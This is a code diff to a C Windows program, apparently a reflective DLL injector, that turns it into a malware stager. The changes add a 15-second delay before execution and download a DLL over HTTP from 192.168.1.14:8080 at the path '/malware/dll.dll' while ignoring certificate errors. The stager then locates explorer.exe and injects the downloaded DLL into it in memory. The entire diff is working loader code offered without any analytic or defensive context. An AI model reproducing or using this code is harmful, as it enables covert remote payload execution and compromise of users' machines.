@@ -29,64 +29,109 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <WinInet.h>
+#include <tlhelp32.h>
 #include "LoadLibraryR.h"
 
 #ifndef __MINGW32__
 #pragma comment(lib,"Advapi32.lib")
+#pragma comment(lib, "Wininet.lib")
 #endif
 
 #define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }
 
-// Simple app to inject a reflective DLL into a process vis its process ID.
+
+DWORD getExplorer() {
+	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 procEntry;
+	procEntry.dwSize = sizeof(PROCESSENTRY32);
+	Process32First(hTH32, &procEntry);
+	do
+	{
+		if (strcmp("explorer.exe", procEntry.szExeFile) == 0) {
+			printf("[+] Explorer found: %d\n", procEntry.th32ProcessID);
+			return procEntry.th32ProcessID;
+		}
+	} while (Process32Next(hTH32, &procEntry));
+	return 0;
+}
+
+DWORD getContentLength(HANDLE hConnect, char* uri) {
+	printf("[+] Getting content length\n");
+	DWORD contentlength = 0;
+	DWORD length = sizeof(contentlength);
+
+	HANDLE hRequestHead = HttpOpenRequestA(hConnect, "HEAD", uri, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_DONT_CACHE, NULL);
+	BOOL reqSuccessHead = HttpSendRequestA(hRequestHead, NULL, NULL, NULL, NULL);
+	if (!reqSuccessHead) {
+		printf("[-] HEAD request failed\n");
+		return 0;
+	}
+	printf("[+] HEAD request successful\n");
+
+	HttpQueryInfoA(hRequestHead, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentlength, &length, 0);
+	printf("[+] Content length: %d bytes\n", contentlength);
+	HttpEndRequestA(hRequestHead, NULL, NULL, NULL);
+	InternetCloseHandle(hRequestHead);
+	return contentlength;
+}
+
+VOID* getDLL(HANDLE hConnect, char* uri, DWORD contentlength, VOID* dll) {
+	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", uri, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_DONT_CACHE, NULL);
+	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
+
+	if (reqSuccess) {
+		DWORD receivedData = 0;
+		while (InternetReadFile(hRequest, dll, contentlength, &receivedData) && receivedData)
+		{
+			printf("[+] Successfully read: %d bytes\n", receivedData);
+		}
+		HttpEndRequestA(hRequest, NULL, NULL, NULL);
+		InternetCloseHandle(hRequest);
+		return dll;
+	}
+	HttpEndRequestA(hRequest, NULL, NULL, NULL);
+	InternetCloseHandle(hRequest);
+	printf("[-] Something went wrong when fetching DLL\n");
+	return NULL;
+}
+
+
+// Simple app to inject a reflective DLL into a process via its process ID.
 int main( int argc, char * argv[] )
 {
-	HANDLE hFile          = NULL;
+	Sleep(15000);
+	char* host = "192.168.1.14";
+	INTERNET_PORT port = 8080;
+	char* uri = "/malware/dll.dll";
+
+	HANDLE hInternet = InternetOpenA(host, INTERNET_OPEN_TYPE_DIRECT, 0, NULL, 0);
+	HANDLE hConnect = InternetConnectA(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
+	DWORD contentlength = getContentLength(hConnect, uri);
+	VOID* content;
+	if (contentlength > 0) {
+		content = malloc(contentlength);
+		getDLL(hConnect, uri, contentlength, content);
+		printf("[+] %s\n", (char*)content);
+	}
+	else {
+		return 0;
+	}
 	HANDLE hModule        = NULL;
 	HANDLE hProcess       = NULL;
 	HANDLE hToken         = NULL;
-	LPVOID lpBuffer       = NULL;
-	DWORD dwLength        = 0;
-	DWORD dwBytesRead     = 0;
+	LPVOID lpBuffer       = content;
+	DWORD dwLength        = contentlength;
 	DWORD dwProcessId     = 0;
 	TOKEN_PRIVILEGES priv = {0};
-
-#ifdef _WIN64
-	char * cpDllFile  = "reflective_dll.x64.dll";
-#else
-#ifdef WIN_X86
-	char * cpDllFile  = "reflective_dll.dll";
-#else WIN_ARM
-	char * cpDllFile  = "reflective_dll.arm.dll";
-#endif
-#endif
+	dwProcessId = getExplorer();
+	if (!dwProcessId) {
+		printf("Failed to get the target process ID\n");
+		return 0;
+	}
 
 	do
 	{
-		// Usage: inject.exe [pid] [dll_file]
-
-		if( argc == 1 )
-			dwProcessId = GetCurrentProcessId();
-		else
-			dwProcessId = atoi( argv[1] );
-
-		if( argc >= 3 )
-			cpDllFile = argv[2];
-
-		hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
-		if( hFile == INVALID_HANDLE_VALUE )
-			BREAK_WITH_ERROR( "Failed to open the DLL file" );
-
-		dwLength = GetFileSize( hFile, NULL );
-		if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
-			BREAK_WITH_ERROR( "Failed to get the DLL file size" );
-
-		lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
-		if( !lpBuffer )
-			BREAK_WITH_ERROR( "Failed to get the DLL file size" );
-
-		if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
-			BREAK_WITH_ERROR( "Failed to alloc a buffer!" );
-
 		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
 		{
 			priv.PrivilegeCount           = 1;
@@ -102,25 +147,17 @@ int main( int argc, char * argv[] )
 		if( !hProcess )
 			BREAK_WITH_ERROR( "Failed to open the target process" );
 
+		printf("[+] Attempting to load library.\n");
 		hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, "ReflectiveLoader", NULL );
-		//hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, MAKEINTRESOURCE(1), NULL );
 		if( !hModule )
 			BREAK_WITH_ERROR( "Failed to inject the DLL" );
 
-		printf( "[+] Injected the '%s' DLL into process %d.", cpDllFile, dwProcessId );
-		
+		printf( "[+] Injected the DLL into process %d.", dwProcessId );
 		WaitForSingleObject( hModule, -1 );
-
 	} while( 0 );
-	
-	if (hFile)
-		CloseHandle(hFile);
-	
-	if( lpBuffer )
-		HeapFree( GetProcessHeap(), 0, lpBuffer );
-
 	if( hProcess )
 		CloseHandle( hProcess );
-
+	if (content)
+		free(content);
 	return 0;
 }
